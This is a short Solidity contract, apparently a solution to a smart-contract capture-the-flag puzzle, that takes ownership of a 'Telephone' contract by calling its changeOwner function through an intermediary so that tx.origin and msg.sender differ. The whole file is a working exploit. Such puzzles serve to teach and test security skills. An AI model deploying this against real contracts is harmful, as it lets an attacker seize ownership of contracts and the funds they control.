// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack() public {
        target.changeOwner(msg.sender);
    }
}
